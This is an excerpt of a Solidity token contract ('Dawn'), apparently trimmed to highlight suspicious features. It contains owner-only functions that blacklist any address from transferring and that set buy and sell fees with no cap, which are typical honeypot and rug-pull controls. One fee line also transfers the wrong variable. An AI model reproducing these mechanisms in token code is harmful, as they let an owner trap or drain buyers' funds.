...
contract Token is ERC20, Ownable {
    ...
    string  name_ = "Dawn";
    string  symbol_ = "Dawn";
    uint256 totalSupply_ = 428888;
    uint256 public deadFee = 0; 
    uint256 public liquidityFee = 0; 
    uint256 public marketingFee = 0; 
    uint256 public foundationFee = 0; 
    uint256 public dvpFee = 0; 
    uint256 public lpRewardFee = 0; 

    uint256 public buymarketingFee = 1; 
    uint256 public buyfoundationFee = 1; 
    uint256 public buydvpFee = 1; 
    uint256 public buylpRewardFee = 3; 

    uint256 public sellmarketingFee = 1; 
    uint256 public sellfoundationFee = 1; 
    uint256 public selldvpFee = 1; 
    uint256 public selllpRewardFee = 5; 
    ...
    mapping (address => bool) private _issuperBlacklist;
   ...
   TokenDividendTracker public dividendTracker;
    ...
    constructor(
        ...
        foundationWalletAddress = 0x28d3a79B5533BB95C54AD9B05bfBE1FA79319E1b;
        dvpAddress = 0x9cDE642Bb2be18720c8F9EC6BD6D258f1FbDA605;
        ...
        _cast(0xFfb8563f9F55c12e2e4A529f98DF6acAE7BDD406, totalSupply);
    }
   ...
   function insuperblacklist(address account) public onlyOwner{
       _issuperBlacklist[account] = true;
   }

   function unsuperblacklist(address account) public onlyOwner{
       _issuperBlacklist[account] = false;
   }
    ...
    function setbuyfee(uint256 mFee, uint256 fFee, uint256 dFee, uint256 lpFee) public onlyOwner {
        buymarketingFee = mFee; 
        buyfoundationFee = fFee; 
        buydvpFee = dFee; 
        buylpRewardFee = lpFee; 
    }

    function setsellfee(uint256 mFee, uint256 fFee, uint256 dFee, uint256 lpFee) public onlyOwner {
        sellmarketingFee = mFee; 
        sellfoundationFee = fFee; 
        selldvpFee = dFee; 
        selllpRewardFee = lpFee; 
    }
    ...
    function _transfer(
        ...
        require(!_issuperBlacklist[from] && !_issuperBlacklist[to], "ERC20: transfer to the zero address");
    ...
    function takeAllFee(address from,uint256 amount) private returns(uint256 amountAfter) {
        ...
        uint256 PFee = amount.mul(dvpFee).div(100);
        if(PFee > 0) super._transfer(from, dvpAddress, FFee);
        amountAfter = amountAfter.sub(PFee);
